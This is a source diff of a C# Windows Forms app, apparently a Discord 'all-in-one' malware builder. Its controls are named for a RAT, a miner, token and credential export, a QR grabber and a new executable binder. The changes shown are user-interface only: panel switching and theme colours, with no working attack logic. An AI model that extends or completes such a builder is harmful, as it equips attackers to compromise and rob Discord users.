@@ -26,7 +26,7 @@ namespace discordAIO6
 {
     public partial class dAIOmain : Form
     {
-        private static string version = "0.6.3";
+        private static string version = "0.7.0";
 
         public DiscordRpcClient dc_client;
 
@@ -37,6 +37,17 @@ namespace discordAIO6
 
         private string cButton = "red";
 
+        private static bool ifExe1 = false;
+        private static bool ifExe2 = false;
+        private static bool ifExe3 = false;
+        private static bool ifExe4 = false;
+        private static bool ifExe5 = false;
+        private static string exe1 = "";
+        private static string exe2 = "";
+        private static string exe3 = "";
+        private static string exe4 = "";
+        private static string exe5 = "";
+
         public dAIOmain()
         {
             InitializeComponent();
@@ -44,7 +55,6 @@ namespace discordAIO6
 
             logoBox.Image = Properties.Resources.d1;
             iconBox.Image = Properties.Resources.none;
-             
 
             pnlNav.Height = btnDashboard.Height;
             pnlNav.Top = btnDashboard.Top;
@@ -59,7 +69,10 @@ namespace discordAIO6
             minerSite.Hide();
             ratSite.Hide();
             qrSite.Hide();
+            binderSite.Hide();
             qrButton.Hide();
+            binderButton.Hide();
+            fakesSite.Hide();
 
             usernameLabel.Text = Environment.UserName;
             versionLabel.Text = version;
@@ -93,7 +106,7 @@ namespace discordAIO6
                 shNo_Click(new object(), new EventArgs());
             }
 
-
+            
 
             refreshLanguage();
             Scintilla();
@@ -216,6 +229,8 @@ namespace discordAIO6
             minerSite.Hide();
             ratSite.Hide();
             qrSite.Hide();
+            binderSite.Hide();
+            fakesSite.Hide();
         }
 
         private void btnInventory_Click(object sender, EventArgs e)
@@ -236,6 +251,8 @@ namespace discordAIO6
             minerSite.Hide();
             ratSite.Hide();
             qrSite.Hide();
+            fakesSite.Hide();
+            binderSite.Hide();
         }
 
         private void btnWork_Click(object sender, EventArgs e)
@@ -256,6 +273,8 @@ namespace discordAIO6
             minerSite.Hide();
             ratSite.Hide();
             qrSite.Hide();
+            fakesSite.Hide();
+            binderSite.Hide();
         }
 
         private void btnMap_Click(object sender, EventArgs e)
@@ -276,6 +295,8 @@ namespace discordAIO6
             minerSite.Hide();
             ratSite.Hide();
             qrSite.Hide();
+            binderSite.Hide();
+            fakesSite.Hide();
         }
 
         private void btnParty_Click(object sender, EventArgs e)
@@ -296,6 +317,8 @@ namespace discordAIO6
             minerSite.Show();
             ratSite.Hide();
             qrSite.Hide();
+            fakesSite.Hide();
+            binderSite.Hide();
         }
 
         private void ratButton_Click(object sender, EventArgs e)
@@ -316,6 +339,8 @@ namespace discordAIO6
             minerSite.Hide();
             ratSite.Show();
             qrSite.Hide();
+            fakesSite.Hide();
+            binderSite.Hide();
         }
 
         private void btnSettings_Click(object sender, EventArgs e)
@@ -328,6 +353,7 @@ namespace discordAIO6
             navLabel.Text = settings;
 
             btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
+            qrButton.BackColor = Color.FromArgb(8, 8, 8);
             mainSite.Hide();
             settingsSite.Show();
             miscSite.Hide();
@@ -336,6 +362,8 @@ namespace discordAIO6
             minerSite.Hide();
             ratSite.Hide();
             qrSite.Hide();
+            fakesSite.Hide();
+            binderSite.Hide();
         }
 
         private void ratButton_Leave(object sender, EventArgs e)
@@ -636,6 +664,73 @@ namespace discordAIO6
             button7.ForeColor = Color.DarkRed;
             button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
             button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            btnInventory.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            btnDashboard.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            btnSettings.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            btnWork.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            btnParty.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            btnMap.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            ratButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            qrButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            shYes.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            shYes.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            shNo.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            shNo.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            btnUpdates.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            btnUpdates.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            fixButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            fixButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            englishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            englishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            russianButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            russianButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            frenchButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            frenchButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            polishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            polishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            spanishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            spanishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            turkishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            turkishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            germanButton.ForeColor = Color.DarkRed;
+            germanButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            germanButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            arabicButton.ForeColor = Color.DarkRed;
+            arabicButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            arabicButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            binderButton.ForeColor = Color.DarkRed;
+            binderButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            binderButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            button11.ForeColor = Color.DarkRed;
+            button11.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            button11.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            button9.ForeColor = Color.DarkRed;
+            button9.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            button9.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            button10.ForeColor = Color.DarkRed;
+            button10.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            button10.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            button12.ForeColor = Color.DarkRed;
+            button12.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            button12.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            button13.ForeColor = Color.DarkRed;
+            button13.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            button13.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            wizardBox.ForeColor = Color.DarkRed;
+            desBox.ForeColor = Color.DarkRed;
+            label55.ForeColor = Color.DarkRed;
+            label48.ForeColor = Color.DarkRed;
+            label49.ForeColor = Color.DarkRed;
+            label58.ForeColor = Color.DarkRed;
+            label59.ForeColor = Color.DarkRed;
+            label64.ForeColor = Color.DarkRed;
+            fakesButton.ForeColor = Color.DarkRed;
+            fakesButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            fakesButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            backButton.ForeColor = Color.DarkRed;
+            backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            label69.ForeColor = Color.DarkRed;
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -886,6 +981,73 @@ namespace discordAIO6
             button7.ForeColor = Color.LimeGreen;
             button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
             button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            btnInventory.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            btnDashboard.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            btnSettings.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            btnWork.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            btnParty.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            btnMap.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            ratButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            qrButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            shYes.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            shYes.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            shNo.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            shNo.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            btnUpdates.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            btnUpdates.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            fixButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            fixButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            englishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            englishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            russianButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            russianButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            frenchButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            frenchButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            polishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            polishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            spanishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            spanishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            turkishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            turkishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            germanButton.ForeColor = Color.LimeGreen;
+            germanButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            germanButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            arabicButton.ForeColor = Color.LimeGreen;
+            arabicButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            arabicButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            binderButton.ForeColor = Color.LimeGreen;
+            binderButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            binderButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            button11.ForeColor = Color.LimeGreen;
+            button11.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            button11.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            button9.ForeColor = Color.LimeGreen;
+            button9.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            button9.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            button10.ForeColor = Color.LimeGreen;
+            button10.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            button10.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            button12.ForeColor = Color.LimeGreen;
+            button12.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            button12.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            button13.ForeColor = Color.LimeGreen;
+            button13.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            button13.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            wizardBox.ForeColor = Color.LimeGreen;
+            desBox.ForeColor = Color.LimeGreen;
+            label55.ForeColor = Color.LimeGreen;
+            label48.ForeColor = Color.LimeGreen;
+            label49.ForeColor = Color.LimeGreen;
+            label58.ForeColor = Color.LimeGreen;
+            label59.ForeColor = Color.LimeGreen;
+            label64.ForeColor = Color.LimeGreen;
+            fakesButton.ForeColor = Color.LimeGreen;
+            fakesButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            fakesButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            backButton.ForeColor = Color.LimeGreen;
+            backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            label69.ForeColor = Color.LimeGreen;
 
         }
 
@@ -1137,6 +1299,73 @@ namespace discordAIO6
             button7.ForeColor = Color.DodgerBlue;
             button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
             button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            btnInventory.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            btnDashboard.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            btnSettings.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            btnWork.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            btnParty.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            btnMap.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            ratButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            qrButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            shYes.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            shYes.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            shNo.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            shNo.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            btnUpdates.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            btnUpdates.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            fixButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            fixButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            englishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            englishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            russianButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            russianButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            frenchButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            frenchButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            polishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            polishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            spanishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            spanishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            turkishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            turkishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            germanButton.ForeColor = Color.DodgerBlue;
+            germanButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            germanButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            arabicButton.ForeColor = Color.DodgerBlue;
+            arabicButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            arabicButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            binderButton.ForeColor = Color.DodgerBlue;
+            binderButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            binderButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            button11.ForeColor = Color.DodgerBlue;
+            button11.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            button11.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            button9.ForeColor = Color.DodgerBlue;
+            button9.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            button9.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            button10.ForeColor = Color.DodgerBlue;
+            button10.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            button10.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            button12.ForeColor = Color.DodgerBlue;
+            button12.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            button12.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            button13.ForeColor = Color.DodgerBlue;
+            button13.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            button13.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            wizardBox.ForeColor = Color.DodgerBlue;
+            desBox.ForeColor = Color.DodgerBlue;
+            label55.ForeColor = Color.DodgerBlue;
+            label48.ForeColor = Color.DodgerBlue;
+            label49.ForeColor = Color.DodgerBlue;
+            label58.ForeColor = Color.DodgerBlue;
+            label59.ForeColor = Color.DodgerBlue;
+            label64.ForeColor = Color.DodgerBlue;
+            fakesButton.ForeColor = Color.DodgerBlue;
+            fakesButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            fakesButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            backButton.ForeColor = Color.DodgerBlue;
+            backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            label69.ForeColor = Color.DodgerBlue;
         }
 
         private void button3_Click(object sender, EventArgs e)
@@ -1254,23 +1483,23 @@ namespace discordAIO6
             buildingLabel.ForeColor = Color.Gainsboro;
             embedBox.BackColor = Color.Gainsboro;
             webhookCheck.ForeColor = Color.Gainsboro;
-            webhookCheck.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            webhookCheck.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            webhookCheck.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            webhookCheck.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             iconUpload.ForeColor = Color.Gainsboro;
-            iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             colorSelect.ForeColor = Color.Gainsboro;
-            colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             generateButton.ForeColor = Color.Gainsboro;
-            generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             cloneButton.ForeColor = Color.Gainsboro;
-            cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             buildButton.ForeColor = Color.Gainsboro;
-            buildButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            buildButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            buildButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            buildButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             label14.ForeColor = Color.Gainsboro;
             label10.ForeColor = Color.Gainsboro;
             label11.ForeColor = Color.Gainsboro;
@@ -1285,11 +1514,11 @@ namespace discordAIO6
             tokenBox.ForeColor = Color.Gainsboro;
             winBox.ForeColor = Color.Gainsboro;
             exportCredentials.ForeColor = Color.Gainsboro;
-            exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             dAIOupload.ForeColor = Color.Gainsboro;
-            dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             label28.ForeColor = Color.Gainsboro;
             pumpBox.ForeColor = Color.Gainsboro;
             pumpPathBox.ForeColor = Color.Gainsboro;
@@ -1323,29 +1552,29 @@ namespace discordAIO6
             mbBox.ForeColor = Color.Gainsboro;
             gbBox.ForeColor = Color.Gainsboro;
             pumpButton.ForeColor = Color.Gainsboro;
-            pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             button4.ForeColor = Color.Gainsboro;
-            button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             tokenChecker.ForeColor = Color.Gainsboro;
-            tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             flooderEmSelect.ForeColor = Color.Gainsboro;
-            flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             button6.ForeColor = Color.Gainsboro;
-            button6.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            button6.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            button6.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button6.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             button5.ForeColor = Color.Gainsboro;
-            button5.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            button5.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            button5.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button5.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             wdeleteButton.ForeColor = Color.Gainsboro;
-            wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             button8.ForeColor = Color.Gainsboro;
-            button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             label39.ForeColor = Color.Gainsboro;
             ratButton.ForeColor = Color.Gainsboro;
             ratBox.ForeColor = Color.Gainsboro;
@@ -1359,17 +1588,17 @@ namespace discordAIO6
             label45.ForeColor = Color.Gainsboro;
             label41.ForeColor = Color.Gainsboro;
             ratInstallButton.ForeColor = Color.Gainsboro;
-            ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             insertButton.ForeColor = Color.Gainsboro;
-            insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             ratCompileButton.ForeColor = Color.Gainsboro;
-            ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             saveButton.ForeColor = Color.Gainsboro;
-            saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             nitroBox.ForeColor = Color.Gainsboro;
             cmdBox.ForeColor = Color.Gainsboro;
             page1.ForeColor = Color.Gainsboro;
@@ -1382,11 +1611,78 @@ namespace discordAIO6
             label46.ForeColor = Color.Gainsboro;
             label51.ForeColor = Color.Gainsboro;
             qrStartBtn.ForeColor = Color.Gainsboro;
-            qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             button7.ForeColor = Color.Gainsboro;
-            button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
-            button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            btnInventory.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            btnDashboard.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            btnSettings.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            btnWork.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            btnParty.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            btnMap.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            ratButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            qrButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            shYes.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            shYes.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            shNo.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
